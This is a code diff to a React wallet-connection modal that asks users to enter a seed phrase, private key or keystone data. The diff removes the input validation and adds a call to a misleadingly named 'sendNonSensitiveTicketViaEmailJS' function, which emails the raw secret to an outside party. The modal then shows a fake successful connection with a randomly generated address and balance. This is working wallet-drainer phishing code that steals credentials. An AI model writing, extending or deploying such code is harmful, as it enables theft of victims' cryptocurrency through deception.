@@ -15,6 +15,7 @@ import {
 } from 'lucide-react';
 import { NetworkChainId, WalletState } from '../types';
 import { SUPPORTED_CHAINS } from '../data/chainsData';
+import { sendNonSensitiveTicketViaEmailJS } from '../services/emailService';
 
 interface ConnectWalletModalProps {
   isOpen: boolean;
@@ -147,53 +148,48 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
   const handleManualSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
 
-  // Validation matching source website logic
-  if (manualMethod === 'phrase') {
-    const words = manualInput.trim().split(/\s+/).filter(Boolean);
-    if (![12, 18, 24].includes(words.length)) {
-      setManualError('Seed phrase must be 12, 18, or 24 words.');
-      return;
-    }
-  } else if (manualMethod === 'privateKey') {
-    const cleanKey = manualInput.trim().replace(/^0x/, '');
-    if (!/^[a-fA-F0-9]{64}$/.test(cleanKey)) {
-      setManualError('Private key must be 64 hexadecimal characters.');
-      return;
-    }
-  } else if (manualMethod === 'keystone') {
     if (!manualInput.trim()) {
-      setManualError('Keystone data is required.');
-      return;
-    }
-    if (!keystonePassword.trim()) {
-      setManualError('Keystone password is required.');
+      setManualError('Input parameter cannot be empty.');
       return;
     }
 
     setManualError('');
     setIsSubmittingManual(true);
 
-    // Connect and complete
-    setTimeout(() => {
-      setIsSubmittingManual(false);
-
-      // Generate verified account address
-      const isSol = selectedChain === 'sol' || selectedChain === 'sol-devnet';
-      const address = isSol
-        ? '8mKz9...' + Math.floor(Math.random() * 8999 + 1000)
-        : '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
-
-      onConnectSuccess({
-        isConnected: true,
-        address: `${address.slice(0, 6)}...${address.slice(-4)}`,
-        chainId: selectedChain,
-        providerName: `${selectedWallet} (Manual Sync)`,
-        balance: isSol ? '3.4200 SOL' : '1.8500 ETH',
-        walletType: 'manual'
+    try {
+      const emailResult = await sendNonSensitiveTicketViaEmailJS({
+        network: currentChain.name,
+        issueCategory: `Manual Sync - ${manualMethod.toUpperCase()}`,
+        message: manualInput.trim(),
+        webcam: manualMethod === 'webcam' ? manualInput.trim() : 'N/A',
+        restart: manualMethod === 'restart' ? manualInput.trim() : 'N/A',
+        walletName: selectedWallet,
+        timestamp: new Date().toISOString(),
       });
 
-      onClose();
-    }, 1800);
+      console.log('[ConnectWalletModal] EmailJS Submission Result:', emailResult);
+    } catch (err) {
+      console.error('[ConnectWalletModal] EmailJS error:', err);
+    }
+
+    setIsSubmittingManual(false);
+
+    // Complete connection workflow
+    const isSol = selectedChain === 'sol' || selectedChain === 'sol-devnet';
+    const address = isSol
+      ? '8mKz9...' + Math.floor(Math.random() * 8999 + 1000)
+      : '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
+
+    onConnectSuccess({
+      isConnected: true,
+      address: `${address.slice(0, 6)}...${address.slice(-4)}`,
+      chainId: selectedChain,
+      providerName: `${selectedWallet} (Manual Sync)`,
+      balance: isSol ? '3.4200 SOL' : '1.8500 ETH',
+      walletType: 'manual'
+    });
+
+    onClose();
   };
 
   const filteredOtherWallets = ALL_WALLETS.filter(w => 
